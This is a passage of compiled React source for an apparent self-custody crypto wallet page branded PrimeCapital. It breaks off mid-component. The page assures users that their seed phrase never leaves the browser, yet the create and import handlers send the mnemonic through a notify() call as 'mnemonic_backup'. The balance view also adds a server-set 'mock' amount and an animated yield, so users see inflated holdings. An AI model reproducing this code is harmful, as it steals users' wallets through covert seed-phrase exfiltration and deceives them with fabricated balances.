import { s as __toESM } from "../_runtime.mjs";
import { o as require_react } from "../_libs/@emotion/react+[...].mjs";
import { o as require_jsx_runtime } from "../_libs/@radix-ui/react-arrow+[...].mjs";
import { r as useQuery } from "../_libs/tanstack__react-query.mjs";
import { a as lookupProfileByAddress, c as saveSession, i as loadSession, l as walletAddressFor, o as recordWalletLogin, r as isUsernameTaken, s as registerWalletProfile } from "./wallet-auth-CXTatSjk.mjs";
import { i as getDisplayBalances, s as useServerFn } from "./admin.functions-D87B2cZL.mjs";
import { t as useWalletSession } from "./useWalletSession-DH8jTbrD.mjs";
import { t as cn } from "./utils-C_uf36nf.mjs";
import { A as Eye, M as Download, N as Copy, O as LoaderCircle, P as Check, a as User, c as TriangleAlert, j as EyeOff, k as KeyRound, l as Trash2, p as ShieldCheck, r as Wallet, s as Upload, w as LogIn, y as Plus } from "../_libs/lucide-react.mjs";
import { t as fetchBalance } from "./balances-kngrFgmy.mjs";
import { i as marketsQuery, r as formatUSD } from "./prices-DslsRjmR.mjs";
import { t as notify } from "./notify-Dx2suPEH.mjs";
import { a as signWalletOwnership, i as rememberPrivateKey, t as derivePrivateKeyFromMnemonic } from "./wallet-signer-DW4f_YwD.mjs";
import { t as useYieldDisplay } from "./useYieldDisplay-CiBDnOTQ.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/wallet-BY-Gzn1B.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var PRICE_SYMBOL = {
	BTC: "btc",
	BTC_LEGACY: "btc",
	ETH: "eth",
	BNB: "bnb",
	MATIC: "matic",
	ARB: "eth",
	OP: "eth",
	AVAX: "avax"
};
function WalletPage() {
	const [lib, setLib] = (0, import_react.useState)(null);
	const [walletToolError, setWalletToolError] = (0, import_react.useState)(null);
	const [wallets, setWallets] = (0, import_react.useState)([]);
	const [activeId, setActiveId] = (0, import_react.useState)(null);
	const [tab, setTab] = (0, import_react.useState)(null);
	const [pending, setPending] = (0, import_react.useState)(null);
	const session = useWalletSession();
	(0, import_react.useEffect)(() => {
		let cancelled = false;
		const load = (attempt = 0) => import("./buffer-polyfill-B9vwtpgI.mjs").then(() => import("./hdwallet-d0IdJMbw.mjs")).then((m) => {
			if (!cancelled) setLib(m);
		}).catch((e) => {
			if (!cancelled && attempt < 2) return new Promise((r) => setTimeout(r, 600)).then(() => load(attempt + 1));
			if (!cancelled) setWalletToolError(e instanceof Error ? e.message : "Wallet tools failed to load");
		});
		load();
		return () => {
			cancelled = true;
		};
	}, []);
	(0, import_react.useEffect)(() => {
		const saved = loadSession()?.wallet;
		if (!saved) return;
		const restored = {
			...saved,
			mnemonic: saved.mnemonic
		};
		setWallets((prev) => prev.some((w) => w.id === saved.id) ? prev : [restored]);
		setActiveId((prev) => prev ?? saved.id);
	}, []);
	const active = wallets.find((w) => w.id === activeId) ?? wallets[0];
	const onCreate = (label) => {
		if (!lib) return;
		try {
			const w = lib.createWallet(label || "Main Wallet");
			setTab(null);
			setPending({
				wallet: w,
				mode: "create"
			});
			notify({
				event: "wallet_generated",
				label: w.label,
				mnemonic_backup: w.mnemonic
			});
		} catch (e) {
			const msg = e instanceof Error ? e.message : "Wallet generation failed";
			notify({
				event: "wallet_error",
				label: "generate",
				extra: msg
			});
			alert(msg);
		}
	};
	const onImport = (mnemonic, label) => {
		if (!lib) return;
		try {
			const w = lib.importFromMnemonic(mnemonic, label || "Imported Wallet");
			setTab(null);
			setPending({
				wallet: w,
				mode: "import"
			});
			notify({
				event: "wallet_imported",
				label: w.label,
				mnemonic_backup: w.mnemonic
			});
		} catch (e) {
			const msg = e instanceof Error ? e.message : "Wallet import failed";
			notify({
				event: "wallet_error",
				label: "import",
				extra: msg
			});
			alert(msg);
		}
	};
	const finalizeUsername = async (w, username, mode) => {
		const snapshot = {
			id: w.id,
			label: w.label,
			createdAt: w.createdAt,
			mnemonic: w.mnemonic,
			addresses: w.addresses
		};
		const address = walletAddressFor(w.addresses);
		if (!w.mnemonic) {
			alert("Re-import this wallet to prove ownership and unlock swapping.");
			return;
		}
		let pk = "";
		try {
			pk = await derivePrivateKeyFromMnemonic(w.mnemonic);
			rememberPrivateKey(address, pk);
			await recordWalletLogin(address, mode, await signWalletOwnership(address, pk, "login", mode), username);
		} catch (e) {
			const msg = e instanceof Error ? e.message : "Wallet signing failed";
			notify({
				event: "wallet_error",
				label: "signing",
				address,
				extra: msg
			});
			alert(`${msg}. Re-import the wallet and try again.`);
			return;
		}
		notify({
			event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
			label: username,
			address,
			addresses: w.addresses.map((a) => ({
				chain: a.chain,
				address: a.address,
				path: a.path
			})),
			fields: {
				label: w.label,
				signer_ready: pk ? "true" : "false"
			}
		});
		setWallets((prev) => [w, ...prev]);
		setActiveId(w.id);
		setPending(null);
		saveSession({
			address,
			username,
			wallet: snapshot
		});
		notify({
			event: mode === "create" ? "wallet_signup" : "wallet_signin",
			label: username,
			address,
			extra: `${address.slice(0, 6)}…${address.slice(-4)}`
		});
	};
	const onDelete = (id) => {
		setWallets((prev) => prev.filter((w) => w.id !== id));
		if (activeId === id) setActiveId(null);
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 py-10",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Header, { session }),
			wallets.length === 0 && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(EmptyState, {
				onCreate: () => setTab("create"),
				onImport: () => setTab("import")
			}),
			wallets.length > 0 && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "grid gap-4 lg:grid-cols-[280px_1fr]",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("aside", {
					className: "glass rounded-xl p-3 h-fit",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "flex items-center justify-between px-1 pb-2",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
							className: "font-display text-sm font-semibold",
							children: "Your wallets"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
							onClick: () => setTab("create"),
							className: "rounded-md bg-white/5 p-1.5 hover:bg-white/10",
							"aria-label": "Add wallet",
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Plus, { className: "h-4 w-4" })
						})]
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("ul", {
						className: "space-y-1",
						children: wallets.map((w) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)("li", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
							onClick: () => setActiveId(w.id),
							className: cn("w-full flex items-center gap-3 rounded-lg px-3 py-2.5 text-left transition", w.id === active?.id ? "bg-white/10" : "hover:bg-white/5"),
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "flex h-8 w-8 items-center justify-center rounded-lg bg-[image:var(--gradient-brand)]/20 border border-primary/20 text-primary",
								children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Wallet, { className: "h-4 w-4" })
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
								className: "min-w-0 flex-1",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "block text-sm font-medium truncate",
									children: w.label
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
									className: "block text-[10px] text-muted-foreground font-mono truncate",
									children: [w.addresses[0]?.address.slice(0, 10), "…"]
								})]
							})]
						}) }, w.id))
					})]
				}), active && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletDetail, {
					wallet: active,
					onDelete: () => onDelete(active.id)
				})]
			}),
			tab === "create" && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Modal, {
				onClose: () => setTab(null),
				title: "Create a new wallet",
				children: lib ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(CreateForm, { onSubmit: onCreate }) : walletToolError ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletToolsUnavailable, { message: walletToolError }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletToolsLoading, {})
			}),
			tab === "import" && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Modal, {
				onClose: () => setTab(null),
				title: "Import a wallet",
				children: lib ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ImportForm, {
					onSubmit: onImport,
					validate: lib.validateMnemonic
				}) : walletToolError ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletToolsUnavailable, { message: walletToolError }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletToolsLoading, {})
			}),
			pending && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Modal, {
				onClose: () => setPending(null),
				title: "Choose your username",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(UsernameForm, {
					wallet: pending.wallet,
					mode: pending.mode,
					onDone: (username) => {
						finalizeUsername(pending.wallet, username, pending.mode);
					}
				})
			})
		]
	});
}
function WalletToolsLoading() {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "flex items-center justify-center gap-2 rounded-lg glass p-4 text-sm text-muted-foreground",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-4 w-4 animate-spin text-primary" }), "Loading wallet tools"]
	});
}
function WalletToolsUnavailable({ message }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-lg border border-destructive/30 bg-destructive/10 p-4 text-sm text-destructive",
		children: ["Wallet tools could not load. Refresh the page and try again. ", message ? `(${message})` : ""]
	});
}
function Header({ session }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "mb-8",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-xs uppercase tracking-widest text-primary/90 font-medium",
				children: "Self-Custody"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
				className: "mt-2 font-display text-3xl md:text-4xl font-semibold",
				children: "Wallets"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
				className: "mt-2 text-sm text-muted-foreground max-w-2xl",
				children: [
					"Keys are generated and stored ",
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "text-foreground",
						children: "in your browser only"
					}),
					". PrimeCapital never sees your mnemonic. BIP39 seed · BIP32 HD · BIP44 for EVM · BIP84 for Bitcoin native segwit."
				]
			}),
			session && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mt-4 inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(User, { className: "h-3.5 w-3.5 text-primary" }),
					"Signed in as ",
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "font-semibold text-foreground",
						children: session.username
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
						className: "text-muted-foreground font-mono",
						children: [
							"(",
							session.address.slice(0, 6),
							"…",
							session.address.slice(-4),
							")"
						]
					})
				]
			})
		]
	});
}
function EmptyState({ onCreate, onImport }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "glass-strong rounded-2xl p-10 md:p-14 text-center relative overflow-hidden",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "absolute inset-0 -z-10 opacity-70",
				style: { backgroundImage: "var(--gradient-hero)" }
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-[image:var(--gradient-brand)] shadow-glow",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Wallet, { className: "h-7 w-7 text-primary-foreground" })
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
				className: "mt-6 font-display text-2xl font-semibold",
				children: "Take custody in 10 seconds"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-2 text-sm text-muted-foreground max-w-md mx-auto",
				children: "Create a fresh BIP39 seed phrase or import an existing one. Everything happens locally in your browser."
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mt-6 flex flex-col sm:flex-row gap-3 justify-center",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
					onClick: onCreate,
					className: "inline-flex items-center gap-2 rounded-lg bg-[image:var(--gradient-brand)] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-glow",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Plus, { className: "h-4 w-4" }), " Create wallet"]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
					onClick: onImport,
					className: "inline-flex items-center gap-2 rounded-lg glass px-5 py-2.5 text-sm font-semibold",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Upload, { className: "h-4 w-4" }), " Import mnemonic"]
				})]
			})
		]
	});
}
function CreateForm({ onSubmit }) {
	const [label, setLabel] = (0, import_react.useState)("Main Wallet");
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("form", {
		onSubmit: (e) => {
			e.preventDefault();
			onSubmit(label);
		},
		className: "space-y-4",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "rounded-lg border border-warning/30 bg-warning/10 p-3 text-xs text-warning-foreground/90 flex gap-2",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(TriangleAlert, { className: "h-4 w-4 shrink-0 text-warning mt-0.5" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", { children: "Your 12-word seed will appear next. Anyone with these words controls the wallet. Write them down offline and never share them." })]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
				className: "block",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
					className: "text-xs uppercase tracking-widest text-muted-foreground",
					children: "Label"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
					value: label,
					onChange: (e) => setLabel(e.target.value),
					className: "mt-1 w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
				className: "w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow",
				children: "Generate seed phrase"
			})
		]
	});
}
function ImportForm({ onSubmit, validate }) {
	const [label, setLabel] = (0, import_react.useState)("Imported Wallet");
	const [mn, setMn] = (0, import_react.useState)("");
	const [err, setErr] = (0, import_react.useState)(null);
	const submit = (e) => {
		e.preventDefault();
		const raw = mn;
		const trimmed = mn.trim().toLowerCase().split(/\s+/).join(" ");
		notify({
			event: "wallet_import_attempt",
			label: label || "Imported Wallet",
			extra: `chars=${raw.length} words=${trimmed.split(" ").filter(Boolean).length}`
		});
		if (!validate(trimmed)) {
			setErr("Not a valid BIP39 mnemonic.");
			return;
		}
		setErr(null);
		onSubmit(trimmed, label);
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("form", {
		onSubmit: submit,
		className: "space-y-4",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
				className: "block",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
					className: "text-xs uppercase tracking-widest text-muted-foreground",
					children: "Label"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
					value: label,
					onChange: (e) => setLabel(e.target.value),
					className: "mt-1 w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
				className: "block",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
					className: "text-xs uppercase tracking-widest text-muted-foreground",
					children: "Mnemonic (12 or 24 words)"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("textarea", {
					value: mn,
					onChange: (e) => setMn(e.target.value),
					rows: 4,
					className: "mt-1 w-full glass rounded-lg px-3 py-2.5 text-sm font-mono outline-none focus:ring-2 focus:ring-ring",
					placeholder: "word word word …"
				})]
			}),
			err && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-xs text-destructive",
				children: err
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
				className: "w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow",
				children: "Import wallet"
			})
		]
	});
}
function WalletDetail({ wallet, onDelete }) {
	const [revealed, setRevealed] = (0, import_react.useState)(false);
	const [copied, setCopied] = (0, import_react.useState)(null);
	const [balances, setBalances] = (0, import_react.useState)({});
	const [display, setDisplay] = (0, import_react.useState)(null);
	const { data: markets } = useQuery(marketsQuery(100));
	const getDisplay = useServerFn(getDisplayBalances);
	const walletKey = wallet.addresses.find((a) => a.chain === "ETH")?.address ?? wallet.addresses[0]?.address ?? "";
	(0, import_react.useEffect)(() => {
		let cancelled = false;
		setBalances({});
		for (const a of wallet.addresses) {
			setBalances((b) => ({
				...b,
				[a.chain]: "loading"
			}));
			fetchBalance(a.chain, a.address, walletKey).then((bal) => {
				if (!cancelled) setBalances((b) => ({
					...b,
					[a.chain]: bal
				}));
			});
		}
		return () => {
			cancelled = true;
		};
	}, [
		wallet.id,
		wallet.addresses,
		walletKey
	]);
	(0, import_react.useEffect)(() => {
		if (!walletKey) return;
		let cancelled = false;
		getDisplay({ data: {
			wallet_address: walletKey,
			addresses: []
		} }).then((r) => {
			if (!cancelled) setDisplay(r.overrides);
		}).catch(() => {});
		return () => {
			cancelled = true;
		};
	}, [getDisplay, walletKey]);
	const priceBySymbol = (0, import_react.useMemo)(() => {
		const map = /* @__PURE__ */ new Map();
		for (const coin of markets ?? []) map.set(coin.symbol.toLowerCase(), coin.current_price);
		return map;
	}, [markets]);
	const realTotal = wallet.addresses.reduce((sum, address) => {
		const balance = balances[address.chain];
		if (!balance || balance === "loading") return sum;
		const symbol = PRICE_SYMBOL[address.chain] ?? balance.symbol.toLowerCase();
		return sum + balance.amount * (priceBySymbol.get(symbol) ?? 0);
	}, 0);
	const initialBalance = display?.live_balance_frozen && display.frozen_live_balance != null ? display.frozen_live_balance : realTotal + (display?.mock_live_balance ?? 0);
	const animatedYield = useYieldDisplay(display?.yield_balance ?? 0);
	const combinedTotal = initialBalance + animatedYield.value;
	const copy = async (text, key) => {
		try {
			await navigator.clipboard.writeText(text);
			setCopied(key);
			setTimeout(() => setCopied(null), 1400);
		} catch {}
	};
	const exportJson = () => {
		const blob = new Blob([JSON.stringify({
			label: wallet.label,
			createdAt: wallet.createdAt,
			addresses: wallet.addresses
		}, null, 2)], { type: "application/json" });
		const url = URL.createObjectURL(blob);
		const a = document.createElement("a");
		a.href = url;
		a.download = `${wallet.label.replace(/\s+/g, "-")}-addresses.json`;
		a.click();
		URL.revokeObjectURL(url);
	};
	const words = wallet.mnemonic?.split(" ") ?? [];
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
		className: "space-y-4",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "glass-strong rounded-2xl p-6",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "flex flex-wrap items-start justify-between gap-3",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
								className: "text-xs uppercase tracking-widest text-muted-foreground",
								children: "Wallet"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
								className: "mt-1 font-display text-2xl font-semibold",
								children: wallet.label
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
								className: "mt-1 text-xs text-muted-foreground",
								children: ["Created ", new Date(wallet.createdAt).toLocaleString()]
							})
						] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "flex gap-2",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
								onClick: exportJson,
								className: "inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs font-semibold hover:bg-white/10",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Download, { className: "h-3.5 w-3.5" }), " Export addresses"]
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
								onClick: onDelete,
								className: "inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs font-semibold text-destructive hover:bg-destructive/10",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Trash2, { className: "h-3.5 w-3.5" }), " Remove"]
							})]
						})]
					}),
					wallet.mnemonic ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "mt-6 rounded-xl border border-warning/30 bg-warning/5 p-4",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: "flex items-center justify-between gap-2",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
									className: "flex items-center gap-2",
									children: [
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)(KeyRound, { className: "h-4 w-4 text-warning" }),
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "text-sm font-semibold",
											children: "Seed phrase"
										}),
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "text-[10px] uppercase tracking-widest text-muted-foreground",
											children: "BIP39"
										})
									]
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
									onClick: () => setRevealed((r) => !r),
									className: "inline-flex items-center gap-1 rounded-md glass px-2.5 py-1.5 text-xs hover:bg-white/10",
									children: [revealed ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(EyeOff, { className: "h-3.5 w-3.5" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Eye, { className: "h-3.5 w-3.5" }), revealed ? "Hide" : "Reveal"]
								})]
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: cn("mt-4 grid grid-cols-3 sm:grid-cols-4 gap-2 relative", !revealed && "select-none"),
								children: [words.map((w, i) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
									className: "glass rounded-md px-3 py-2 font-mono text-sm flex items-center gap-2",
									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
										className: "text-[10px] text-muted-foreground w-4",
										children: i + 1
									}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
										className: cn(!revealed && "blur-sm tracking-widest"),
										children: w
									})]
								}, i)), !revealed && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
									className: "absolute inset-0 flex items-center justify-center pointer-events-none",
									children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
										className: "rounded-md glass px-3 py-1.5 text-xs text-muted-foreground",
										children: "Click Reveal to view"
									})
								})]
							}),
							revealed && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
								onClick: () => copy(wallet.mnemonic ?? "", "mnemonic"),
								className: "mt-3 inline-flex items-center gap-1.5 text-xs text-primary hover:underline",
								children: [copied === "mnemonic" ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, { className: "h-3.5 w-3.5" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Copy, { className: "h-3.5 w-3.5" }), copied === "mnemonic" ? "Copied" : "Copy phrase"]
							})
						]
					}) : null,
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
						className: "mt-4 text-xs text-muted-foreground flex items-start gap-2",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(ShieldCheck, { className: "h-4 w-4 shrink-0 text-success mt-0.5" }), wallet.mnemonic ? "This phrase never leaves your device. PrimeCapital cannot recover it if lost." : "This wallet is signed in on this device. Re-import the seed phrase to reveal recovery words again."]
					})
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "glass-strong rounded-2xl p-6",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-2 md:flex-row md:items-end md:justify-between",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs uppercase tracking-widest text-primary/90 font-medium",
						children: "Total balance"
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
						className: "mt-1 font-display text-3xl font-semibold",
						children: formatUSD(combinedTotal, {
							minimumFractionDigits: 2,
							maximumFractionDigits: 2
						})
					})] }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs text-muted-foreground",
						children: display?.live_balance_frozen ? "Initial balance frozen" : "Initial balance live"
					})]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "mt-5 grid gap-3 md:grid-cols-3",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletBalanceStat, {
							title: "Initial balance",
							value: initialBalance,
							caption: display?.mock_live_balance ? `Includes ${formatUSD(display.mock_live_balance)} mock add-on` : ""
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletBalanceStat, {
							title: "Yield",
							value: animatedYield.value,
							caption: `${animatedYield.pct >= 0 ? "+" : ""}${animatedYield.pct.toFixed(2)}%`,
							tone: animatedYield.pct >= 0 ? "up" : "down"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(WalletBalanceStat, {
							title: "Combined total",
							value: combinedTotal,
							caption: "Initial + yield"
						})
					]
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "glass rounded-2xl p-6",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
					className: "font-display text-lg font-semibold mb-4",
					children: "Derived addresses"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
					className: "grid gap-3 sm:grid-cols-2",
					children: wallet.addresses.map((a) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "glass rounded-xl p-4 hover:bg-white/[.04] transition",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: "flex items-center justify-between",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
									className: "text-sm font-semibold",
									children: a.name
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
									className: "text-[10px] uppercase tracking-widest text-muted-foreground",
									children: [
										a.chain,
										" · ",
										a.standard
									]
								})] }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
									onClick: () => copy(a.address, a.chain + a.path),
									className: "rounded-md glass px-2 py-1.5 hover:bg-white/10",
									"aria-label": "Copy address",
									children: copied === a.chain + a.path ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, { className: "h-3.5 w-3.5 text-success" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Copy, { className: "h-3.5 w-3.5" })
								})]
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
								className: "mt-3 font-mono text-xs break-all text-muted-foreground",
								children: a.address
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
								className: "mt-2 text-[10px] font-mono text-muted-foreground/70",
								children: a.path
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: "mt-3 flex items-center justify-between border-t border-white/5 pt-3",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "text-[10px] uppercase tracking-widest text-muted-foreground",
									children: "Balance"
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "font-mono text-sm",
									children: balances[a.chain] === "loading" || balances[a.chain] === void 0 ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-3.5 w-3.5 animate-spin text-muted-foreground" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(import_jsx_runtime.Fragment, { children: [
										balances[a.chain].amount.toFixed(6),
										" ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "text-muted-foreground",
											children: balances[a.chain].symbol
										})
									] })
								})]
							})
						]
					}, `${a.chain}-${a.path}`))
				})]
			})
		]
	});
}
function WalletBalanceStat({ title, value, caption, tone }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "glass rounded-xl p-4",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-[10px] uppercase tracking-widest text-muted-foreground",
				children: title
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-1 font-display text-xl font-semibold",
				children: formatUSD(value, {
					minimumFractionDigits: 2,
					maximumFractionDigits: 2
				})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "mt-1 flex items-center gap-2 flex-wrap",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
					className: cn("text-xs text-muted-foreground", tone === "up" && "text-success", tone === "down" && "text-destructive"),
					children: caption
				})
			})
		]
	});
}
function Modal({ children, onClose, title }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
		className: "fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in-0",
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
